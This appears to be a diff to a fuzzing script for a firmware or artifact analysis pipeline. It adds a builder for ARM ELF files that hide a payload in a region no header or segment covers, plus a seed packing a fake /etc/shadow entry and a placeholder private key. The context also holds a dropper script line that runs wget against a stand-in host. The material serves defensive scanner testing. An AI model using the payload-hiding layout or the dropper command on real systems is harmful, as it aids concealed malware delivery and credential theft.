@@ -21,7 +21,8 @@ are written to the output directory. Usage (from the repository root; seconds pe
 scripts/fuzz_pipeline.py reuses the seeds and mutations for the whole upload -> worker -> reports chain.
 
 Found so far: every lzop artifact leaked 448 KiB of LZO work memory (a few hundred lzop files aborted the analysis
-under the local sandbox's address-space limit). Last run (2026-11-05, 150 s per seed): ~306,000 inputs, nothing else.
+under the local sandbox's address-space limit). Last runs (2026-11-05): ~306,000 inputs; after the fourth review ~538,000 (with its
+layouts as seeds), nothing else.
 """
 from __future__ import annotations
 
@@ -179,6 +180,22 @@ def arm_elf(profile: bytes, payload: bytes = b"") -> bytes:
         + struct.pack("<IIIIIIIIII", 17, 3, 0, 0, str_off, len(shstr), 0, 0, 1, 0) + payload
 
 
+
+def arm_elf_hiding(payload: bytes) -> tuple[bytes, list[int]]:
+    """An ARM Linux executable whose section header table sits after ``payload``: the payload lies inside its extent,
+    covered by no header, section or segment. Returns it with the offsets of its header and table fields."""
+    code = bytes(range(256))
+    code_off = 52 + 32
+    sh_off = code_off + len(code) + len(payload)
+    sh_off += -sh_off % 4
+    eh = b"\x7fELF\x01\x01\x01" + b"\x00" * 9 + struct.pack("<HHIIIIIHHHHHH", 2, 40, 1, 0x10000 + code_off, 52,
+                                                              sh_off, 0x05000400, 52, 32, 1, 40, 2, 0)
+    ph = struct.pack("<IIIIIIII", 1, 0, 0x10000, 0x10000, code_off + len(code), code_off + len(code), 5, 0x1000)
+    body = eh + ph + code + payload
+    body += b"\x00" * (sh_off - len(body))
+    elf = body + b"\x00" * 40 + struct.pack("<IIIIIIIIII", 0, 1, 6, 0x10000 + code_off, code_off, len(code), 0, 0, 4, 0)
+    return elf, [0, 28, 32, 44, 48, 52 + 4, 52 + 16, code_off + len(code), sh_off, sh_off + 56, sh_off + 60]
+
 KEY = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA" + b"A" * 64 + b"\n-----END RSA PRIVATE KEY-----\n"
 ROOTFS = {"etc/shadow": b"root:$1$abc$DEFghijklmnopqrstuv12/:19000:0:99999:7:::\n",
           "etc/os-release": b'ID=debian\nVERSION_ID="12"\n', "etc/ssl/server.key": KEY,
@@ -230,6 +247,8 @@ def build_seeds(tmp: Path) -> dict[str, tuple[bytes, list[int]]]:
     elf = arm_elf(b"A")
     overlay = zip_of({"payload/dropper.sh": b"#!/bin/sh\nwget http://example.test/x\n", "k": KEY})
     seeds["elf_overlay"] = (elf + overlay, [0, 28, 32, 46, 48, len(elf) - 80, len(elf), len(elf) + len(overlay) - 22])
+    seeds["elf_uncovered"] = arm_elf_hiding(noise(300) + zip_of({"etc/shadow": ROOTFS["etc/shadow"], "k": KEY})
+                                            + noise(200))
     mcu = arm_elf(b"M", gzip.compress(tar_of({"etc/ssl/k": KEY}), mtime=0) + MODULE_SIG_MARKER)
     seeds["mcu_elf_marker"] = (mcu, [0, 32, len(mcu) - len(MODULE_SIG_MARKER) - 12, len(mcu) - 28])
 
